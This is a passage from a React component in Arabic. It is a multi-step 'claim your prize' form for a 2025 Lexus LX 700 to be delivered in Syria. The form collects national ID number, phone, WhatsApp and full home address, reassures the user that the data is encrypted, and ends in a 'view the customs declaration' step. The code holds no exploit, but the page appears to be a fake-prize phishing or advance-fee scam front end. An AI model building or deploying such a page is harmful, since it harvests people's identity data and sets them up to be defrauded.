                    inputMode="numeric"
                    placeholder="11 رقم"
                    maxLength={11}
                    className="bg-secondary/40 border-border text-foreground h-12 text-base"
                  />
                </div>

                <div>
                  <label className="block text-sm font-bold text-foreground mb-2">
                    رقم الجوال <span className="text-gold">*</span>
                  </label>
                  <Input
                    name="phone"
                    value={formData.phone}
                    onChange={handleInputChange}
                    required
                    inputMode="tel"
                    placeholder="09xxxxxxxx"
                    className="bg-secondary/40 border-border text-foreground h-12 text-base"
                  />
                </div>

                <div className="md:col-span-2">
                  <label className="block text-sm font-bold text-foreground mb-2">
                    رقم الواتساب{" "}
                    <span className="text-muted-foreground text-xs">(اختياري - إن اختلف عن الجوال)</span>
                  </label>
                  <Input
                    name="whatsapp"
                    value={formData.whatsapp}
                    onChange={handleInputChange}
                    inputMode="tel"
                    placeholder="09xxxxxxxx"
                    className="bg-secondary/40 border-border text-foreground h-12 text-base"
                  />
                </div>
              </div>

              <div className="bg-gold/5 border border-gold/20 rounded-lg p-4 text-sm text-muted-foreground">
                <p className="flex items-start gap-2">
                  <ShieldCheck className="w-5 h-5 text-gold flex-shrink-0 mt-0.5" />
                  <span>
                    بياناتك محمية ومشفرة ولن يتم استخدامها إلا لأغراض التحقق وتسليم الجائزة الرسمية فقط.
                  </span>
                </p>
              </div>

              <div className="flex justify-end pt-4">
                <Button
                  type="button"
                  onClick={() => setStage("form2")}
                  disabled={!canProceedStep1}
                  className="bg-gold-gradient hover:opacity-90 text-background font-bold h-12 px-8 text-base shadow-gold disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  التالي
                  <ChevronLeft className="w-5 h-5 mr-2" />
                </Button>
              </div>
            </div>
          )}

          {stage === "form2" && (
            <div className="space-y-6">
              <div className="text-center mb-8">
                <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-gold/10 border border-gold/30 mb-4">
                  <MapPin className="w-7 h-7 text-gold" />
                </div>
                <h2 className="text-2xl md:text-3xl font-extrabold text-foreground mb-2">
                  عنوان تسليم السيارة
                </h2>
                <p className="text-muted-foreground text-sm">
                  سيتم تسليم السيارة رسمياً داخل سوريا في العنوان المحدد
                </p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                <div>
                  <label className="block text-sm font-bold text-foreground mb-2">
                    المحافظة <span className="text-gold">*</span>
                  </label>
                  <select
                    name="governorate"
                    value={formData.governorate}
                    onChange={(e) => setFormData({ ...formData, governorate: e.target.value })}
                    required
                    className="w-full bg-secondary/40 border border-border rounded-md text-foreground h-12 px-3 text-base focus:outline-none focus:ring-2 focus:ring-gold"
                  >
                    <option value="">اختر المحافظة</option>
                    {syrianGovernorates.map((gov) => (
                      <option key={gov} value={gov}>
                        {gov}
                      </option>
                    ))}
                  </select>
                </div>

                <div>
                  <label className="block text-sm font-bold text-foreground mb-2">
                    المدينة / المنطقة <span className="text-gold">*</span>
                  </label>
                  <Input
                    name="city"
                    value={formData.city}
                    onChange={handleInputChange}
                    required
                    placeholder="مثال: المزة"
                    className="bg-secondary/40 border-border text-foreground h-12 text-base"
                  />
                </div>

                <div className="md:col-span-2">
                  <label className="block text-sm font-bold text-foreground mb-2">
                    العنوان التفصيلي <span className="text-gold">*</span>
                  </label>
                  <Input
                    name="address"
                    value={formData.address}
                    onChange={handleInputChange}
                    required
                    placeholder="الحي - الشارع - رقم المبنى"
                    className="bg-secondary/40 border-border text-foreground h-12 text-base"
                  />
                </div>

                <div className="md:col-span-2">
                  <label className="block text-sm font-bold text-foreground mb-2">
                    أقرب معلم مميز{" "}
                    <span className="text-muted-foreground text-xs">(اختياري)</span>
                  </label>
                  <Input
                    name="nearestLandmark"
                    value={formData.nearestLandmark}
                    onChange={handleInputChange}
                    placeholder="مثال: بجانب مدرسة... / مقابل صيدلية..."
                    className="bg-secondary/40 border-border text-foreground h-12 text-base"
                  />
                </div>
              </div>

              <div className="bg-secondary/40 border border-gold/20 rounded-xl p-5">
                <h3 className="font-bold text-foreground mb-3 flex items-center gap-2">
                  <Sparkles className="w-5 h-5 text-gold" />
                  ملخص بياناتك
                </h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-sm">
                  <div className="flex justify-between border-b border-border/50 pb-2">
                    <span className="text-muted-foreground">الاسم:</span>
                    <span className="text-foreground font-medium">{formData.fullName || "—"}</span>
                  </div>
                  <div className="flex justify-between border-b border-border/50 pb-2">
                    <span className="text-muted-foreground">الرقم الوطني:</span>
                    <span className="text-foreground font-medium">{formData.nationalId || "—"}</span>
                  </div>
                  <div className="flex justify-between border-b border-border/50 pb-2">
                    <span className="text-muted-foreground">الجوال:</span>
                    <span className="text-foreground font-medium">{formData.phone || "—"}</span>
                  </div>
                  <div className="flex justify-between border-b border-border/50 pb-2">
                    <span className="text-muted-foreground">الجائزة:</span>
                    <span className="text-gold font-bold">لكزس LX 700 - 2025</span>
                  </div>
                </div>
              </div>

              <div className="flex flex-col-reverse md:flex-row justify-between gap-3 pt-4">
                <Button
                  type="button"
                  onClick={() => setStage("form1")}
                  variant="outline"
                  className="border-border bg-transparent text-foreground hover:bg-secondary h-12 px-8 text-base"
                >
                  <ChevronRight className="w-5 h-5 ml-2" />
                  السابق
                </Button>
                <Button
                  type="submit"
                  disabled={!canProceedStep2}
                  className="bg-gold-gradient hover:opacity-90 text-background font-bold h-12 px-8 text-base shadow-gold disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  <FileText className="w-5 h-5 ml-2" />
                  عرض البيان الجمركي
                </Button>
              </div>
            </div>
          )}
        </form>
      </CardContent>
      </Card>
    </>
  )
}
